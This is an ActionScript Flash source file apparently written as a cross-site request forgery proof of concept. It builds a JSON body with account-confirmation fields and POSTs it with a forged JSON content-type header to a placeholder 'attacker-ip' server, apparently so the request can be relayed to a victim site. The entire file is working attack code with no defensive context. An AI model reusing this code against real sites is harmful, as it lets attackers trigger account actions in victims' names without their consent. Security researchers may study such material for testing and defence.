package
{
  import flash.display.Sprite;
  import flash.net.URLLoader;
  import flash.net.URLRequest;
  import flash.net.URLRequestHeader;
  import flash.net.URLRequestMethod;
public class csrf extends Sprite
  {
    public function csrf()
    {
      super();
      var member1:Object = null;
      var myJson:String = null;
      member1 = new Object();
      member1 = {
          "acctnum":"100",
          "confirm":"true"
      };
      var myData:Object = member1;
      myJson = JSON.stringify(myData);
      var url:String = "http://attacker-ip:8000/";
      var request:URLRequest = new URLRequest(url);
      request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));
      request.data = myJson;
      request.method = URLRequestMethod.POST;
      var urlLoader:URLLoader = new URLLoader();
try
      {
          urlLoader.load(request);
          return;
      }
      catch(e:Error)
      {
          trace(e);
          return;
      }
    }
  }
}
